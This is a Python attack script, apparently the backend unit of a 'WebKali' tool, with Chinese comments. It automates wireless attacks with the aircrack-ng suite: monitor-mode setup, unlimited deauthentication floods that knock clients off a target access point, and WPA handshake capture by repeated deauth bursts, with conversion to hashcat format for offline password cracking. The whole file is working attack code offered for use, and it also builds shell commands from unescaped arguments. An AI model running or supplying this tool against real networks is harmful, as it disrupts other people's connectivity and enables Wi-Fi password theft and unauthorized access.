import argparse
import subprocess
import time
import os
import sys
import shutil
import glob

# ==========================================
# WebKali 攻击执行单元 (修复握手包捕获版)
# ==========================================

# 修复环境变量
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    """执行命令但不阻塞"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg, level="INFO"):
    """标准日志输出"""
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    print(f"[{level}] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...", "DEBUG")

    # 1. 关键修复：杀掉干扰进程 (解决 5GHz 跳频问题)
    run_cmd("airmon-ng check kill")

    # 2. 优先使用 airmon-ng 开启监听
    if shutil.which("airmon-ng"):
        # 即使已经是 monitor 模式，也建议重置一下以确保干净
        run_cmd(f"airmon-ng stop {interface}")
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"iw dev {interface} set type monitor")
        run_cmd(f"ip link set {interface} up")
    else:
        # 备用方案
        run_cmd(f"ifconfig {interface} down")
        run_cmd(f"iwconfig {interface} mode monitor")
        run_cmd(f"ifconfig {interface} up")

    # 3. 强制锁定信道 (双重锁定)
    run_cmd(f"iw dev {interface} set channel {channel}")
    run_cmd(f"iwconfig {interface} channel {channel}")
    time.sleep(2)  # 等待网卡稳定
    log(f"网卡 {interface} 已锁定在信道 {channel}", "SUCCESS")


def attack_deauth(bssid, interface, duration):
    """Deauth 攻击 (用于 Evil Twin 或单纯干扰)"""
    log(f"启动 Deauth 攻击: {bssid}", "INFO")

    # --ignore-negative-one 修复某些网卡报错
    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"

    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    start_time = time.time()

    try:
        while True:
            # 检查时间限制 (0为无限)
            if duration > 0 and (time.time() - start_time) > duration:
                break

            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            if line and "Sending" in line:
                if int(time.time()) % 5 == 0:  # 减少刷屏
                    print(f"[Attack] ⚡ 发送 Deauth 数据包... (目标断线中)")

            sys.stdout.flush()
    except Exception:
        pass
    finally:
        process.terminate()
        run_cmd("killall aireplay-ng")


def capture_handshake(bssid, interface, channel, duration):
    """
    完整的握手包捕获逻辑 (修复版)
    """
    duration = int(duration) if int(duration) > 0 else 60
    log(f"开始捕获握手包: Target={bssid} (限时 {duration}s)", "START")

    clean_bssid = bssid.replace(":", "")
    dump_prefix = f"/tmp/handshake_{clean_bssid}"

    # 清理旧文件
    run_cmd(f"rm -f {dump_prefix}*")

    # 1. 启动 airodump-ng 后台抓包
    # 必须指定 --channel，否则会因为扫描跳频而漏掉握手包
    log("启动抓包进程...", "INFO")
    dump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {dump_prefix} --output-format cap {interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start_time = time.time()
    handshake_captured = False

    try:
        time.sleep(3)  # 等待 airodump 启动

        while (time.time() - start_time) < duration:
            # 2. 间歇性发送 Deauth 攻击 (诱导重连)
            # -0 5 表示发送 5 组攻击包，不要一直发，否则客户端连不上无法产生握手包
            log("发送 Deauth 诱导重连...", "ATTACK")
            run_cmd(f"aireplay-ng -0 5 -a {bssid} {interface} --ignore-negative-one")

            # 3. 检查是否抓到握手包
            # 查找最新的 .cap 文件
            cap_files = glob.glob(f"{dump_prefix}*.cap")
            if cap_files:
                latest_cap = max(cap_files, key=os.path.getctime)

                # 使用 aircrack-ng 检查文件内容
                check_cmd = f"aircrack-ng {latest_cap} | grep '1 handshake'"
                res = subprocess.run(check_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                if "1 handshake" in res.stdout:
                    log("✅ 成功捕获握手包! (WPA Handshake Captured)", "SUCCESS")
                    print("CAPTURED_HS_POTENTIAL")  # 关键标记，供后端识别
                    handshake_captured = True

                    # (可选) 立即转换为 hashcat 格式
                    if shutil.which("hcxpcapngtool"):
                        run_cmd(f"hcxpcapngtool -o {dump_prefix}.hc22000 {latest_cap}")

                    break

            # 等待几秒让客户端重连
            time.sleep(5)

        if not handshake_captured:
            log("超时：未捕获到握手包，请尝试靠近目标或增加时间", "FAIL")

    except Exception as e:
        log(f"捕获流程出错: {e}", "ERROR")
    finally:
        # 清理进程
        dump_proc.terminate()
        run_cmd("killall airodump-ng")
        run_cmd("killall aireplay-ng")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="0")
    args = parser.parse_args()

    setup_monitor(args.interface, args.channel)

    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, int(args.duration))
    elif args.mode == "handshake":
        capture_handshake(args.bssid, args.interface, args.channel, args.duration)